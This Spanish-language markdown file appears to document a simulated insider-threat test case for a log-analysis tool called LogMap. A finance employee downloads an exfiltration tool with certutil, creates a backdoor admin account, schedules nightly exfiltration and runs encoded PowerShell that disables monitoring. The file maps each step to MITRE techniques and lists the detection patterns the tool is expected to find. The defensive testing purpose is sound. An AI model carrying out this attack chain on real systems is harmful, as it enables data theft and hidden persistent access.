# Caso 5 — Insider Threat: Empleado malicioso con acceso legítimo

## Perfil del actor

**rgarcia** — Finance Manager en FINCO S.A. Empleado con 7 años en la empresa, acceso legítimo a sistemas financieros y de archivos. Detectado en proceso de selección para competencia directa. Decide exfiltrar datos antes de su marcha.

- **Tipo:** Insider malicioso con acceso privilegiado (no un atacante externo)
- **Motivación:** Llevar datos financieros a empleador competidor
- **Referencias:** CERT Insider Threat Center — Financial Services Sector, CISA Insider Threat Advisory 2022

---

## Técnicas MITRE ATT&CK aplicadas

| ID | Nombre | Descripción en este log |
|----|--------|------------------------|
| T1078 | Valid Accounts | Login con credenciales propias — sin brute force |
| T1059.001 | PowerShell | Payload de exfiltración con `-enc` y `-nop` |
| T1105 | Ingress Tool Transfer | `certutil.exe` descarga herramienta de compresión/exfil |
| T1136.001 | Create Local Account | Cuenta backdoor `svc_backup02` para acceso post-despido |
| T1098 | Account Manipulation | `svc_backup02` añadida al grupo Administrators |
| T1053.005 | Scheduled Task | Tarea `DbSyncNightly` para exfiltración nocturna automatizada |
| T1048 | Exfiltration Over Alt Protocol | PowerShell enviando datos a servidor externo |

---

## Escenario simulado

### ¿Por qué es el caso más difícil de detectar?

A diferencia de los casos APT o ransomware:
- **Sin brute force** — usa sus propias credenciales correctas
- **Sin IP externa** — accede desde dentro de la red corporativa
- **Sin horario anómalo** — comienza en horario laboral normal (08:52)
- **Con acceso legítimo** — sus permisos son los correctos para su rol

El único desvío del comportamiento normal es la descarga de `certutil.exe` a las 16:31, que activa la cadena de detección.

### Línea de tiempo (08:52 – 17:01 UTC)

```
08:52  4624  rgarcia login local (Type=2) — inicio normal de jornada
09:15  4624  rgarcia → SRV-FILE-02 (acceso normal a archivos)
11:30  4624  rgarcia → SRV-DB-01 (acceso a BD — en su scope de rol)
14:05  4624  rgarcia → SRV-FILE-02 (acceso a archivos de nuevo)

--- ACTIVIDAD SOSPECHOSA desde 16:31 ---

16:31  4688  certutil.exe -urlcache -f [URL]/exfil_tool.exe
              → certutil EN SUSPICIOUS_PROCESSES
              → rgarcia entra en suspicious_users
16:32  4688  upd.exe -compress -archive (herramienta descargada)
16:35  4720  Cuenta svc_backup02 creada
              → T1136.001 detectado
16:36  4732  svc_backup02 → grupo Administrators
              → T1098 detectado
16:38  4698  Tarea DbSyncNightly creada por rgarcia
              → PERSISTENCE detectado (rgarcia en suspicious_users)
16:40  4624  svc_backup02 logon — verifica que el backdoor funciona
16:40  4672  svc_backup02 → privilegios especiales
16:43  4688  powershell.exe -enc [...] desde rgarcia
              → T1059.001 detectado (exfiltración)
16:48  4688  powershell.exe -enc [...] desde svc_backup02
              → Deshabilita monitorización en tiempo real
17:01  4634  rgarcia logoff — fin de jornada
```

---

## Patrones que debe detectar LogMap

| Patrón | Descripción esperada |
|--------|---------------------|
| `PERSISTENCE` | rgarcia (suspicious por certutil) → 4698 tarea DbSyncNightly |
| T1136.001 | Cuenta svc_backup02 creada (4720) → HIGH severity |
| T1098 | svc_backup02 → Administrators (4732) → HIGH severity |
| T1059.001 | PowerShell con `-enc`, `-nop`, `-exec bypass` en 4688 |
| T1105 | certutil.exe en SUSPICIOUS_PROCESSES → flagged como suspicious |

**No detectado automáticamente (requiere análisis contextual):**
- La exfiltración en sí (LogMap detecta el mecanismo, no los datos específicos)
- Los accesos "legítimos" a archivos antes de las 16:31 (dentro del rol)
- El comportamiento de horario de trabajo normal

---

## La diferencia clave frente a los otros casos

```
Caso 1 (APT29):    BRUTE_FORCE + LATERAL_MOVE + PRIV_ESCALATION = señales fuertes
Caso 2 (FIN7):     BRUTE_FORCE + SPRAY_ATTACK = señales muy fuertes
Caso 3 (Lazarus):  PRIV_ESCALATION + PASS_THE_HASH = señales fuertes
Caso 4 (WannaCry): BRUTE_FORCE + LATERAL_MOVE masivo = señal visual clara

Caso 5 (Insider):  Solo PERSISTENCE + técnicas individuales = señal débil
                   → Requiere análisis de comportamiento (UEBA) para detección
                   → LogMap detecta los síntomas, no el patrón global
```

El insider threat demuestra la **limitación real de los sistemas basados en reglas**: sin correlación de comportamiento histórico y análisis de anomalías por usuario (UEBA — User Entity Behavior Analytics), los eventos de este caso parecen casi normales hasta las 16:31.

---

## Extensión recomendada para LogMap

Para mejorar la detección de insider threat, LogMap podría incorporar:

1. **Baseline de usuario**: si rgarcia nunca antes ejecutó certutil, el primer uso es anomalía de alta prioridad
2. **Análisis de volumen**: accesos a múltiples servidores el mismo día (FIN-04, FILE-02 × 2, DB-01)
3. **Correlación temporal**: actividad que escala en las últimas horas de la jornada
4. **Detección de cuentas nuevas**: cualquier 4720 seguido de 4732 en menos de 60 segundos es un patrón de backdoor

---

## Nodos esperados en el grafo

- Usuarios: `rgarcia`, `svc_backup02`
- IPs: `10.50.1.88`
- Workstations: `WKSTN-FIN-04`, `SRV-FILE-02`, `SRV-DB-01`
- Procesos: `certutil.exe`, `upd.exe`, `powershell.exe`
- Eventos: 4624 × 4, 4634, 4672, 4688 × 4, 4698, 4720, 4732

**Total esperado: 14+ nodos**

---

## Referencia

- [CISA: Insider Threat Mitigation Guide](https://www.cisa.gov/sites/default/files/publications/CISA-Insider-Threat-Guide.pdf)
- [CERT Insider Threat Center: Financial Sector](https://resources.sei.cmu.edu/library/asset-view.cfm?assetid=484738)
- [MITRE ATT&CK: Insider Threat Tactic Coverage](https://attack.mitre.org/mitigations/M1017/)
